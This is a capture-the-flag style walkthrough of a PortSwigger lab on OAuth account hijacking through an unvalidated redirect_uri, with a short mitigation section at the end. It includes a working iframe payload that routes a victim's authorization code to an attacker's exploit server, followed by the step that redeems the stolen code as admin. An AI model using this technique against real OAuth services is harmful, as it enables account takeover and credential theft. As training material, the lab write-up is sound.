# Lab 01 — OAuth account hijacking via redirect_uri

> **Expert** · [Official lab](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

**Entry point:** the authorization request accepts **any** `redirect_uri`
— the `code` goes wherever you point it.

## Solution

1. Log in via OAuth twice (second time needs no credentials — active
   service session) and capture `GET /auth?client_id=...`.
2. Confirm arbitrary `redirect_uri` is accepted → the code lands there.
3. Host the attack on the exploit server:

```html
<iframe src="https://oauth-YOUR-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

4. Deliver to victim → their `code` appears in your access log.
5. Redeem it yourself:
   `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
   → logged in as admin → delete carlos — lab solved.

## Mitigation

Strictly allow-list `redirect_uri` (exact match, no extra characters) and
bind the code to the client + a `state` nonce.
